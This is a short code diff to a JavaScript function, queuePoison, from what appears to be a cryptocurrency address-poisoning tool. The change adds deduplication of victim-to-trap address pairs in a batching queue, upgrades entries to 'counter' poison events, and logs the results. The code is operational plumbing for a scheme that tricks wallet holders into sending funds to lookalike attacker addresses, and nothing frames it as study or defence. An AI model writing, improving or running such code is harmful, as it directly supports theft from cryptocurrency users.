@@ -1179,6 +1179,30 @@ function queuePoison(campaignId, contractAddress, victimAddress, trapAddress, ra
   }
 
   const queue = poisonQueue.get(key);
+
+  // 🚀 DEDUPLICATION FIX: Prevent duplicate victim -> trap pairs in the same batch
+  const existingIndex = queue.findIndex(item =>
+    item.victimAddress.toLowerCase() === victimAddress.toLowerCase() &&
+    item.trapAddress.toLowerCase() === trapAddress.toLowerCase()
+  );
+
+  if (existingIndex !== -1) {
+    // Already in queue! Update the existing item instead of adding a duplicate.
+    const existingItem = queue[existingIndex];
+
+    // Upgrade to 'counter' type if the new event is a counter-poison (gives it the 🏆 icon)
+    if (type === 'counter' && existingItem.type === 'auto') {
+      existingItem.type = 'counter';
+    }
+
+    // Update value and timestamp to the absolute latest
+    existingItem.rawValue = rawValue;
+    existingItem.timestamp = Date.now();
+
+    logger.info(`[batch] ♻️ Deduplicated: ${victimAddress.slice(0, 10)}... → ${trapAddress.slice(0, 10)}... already in queue. Updated existing.`);
+    return; // Skip pushing and threshold checks
+  }
+
   queue.push({
     victimAddress,
     trapAddress,
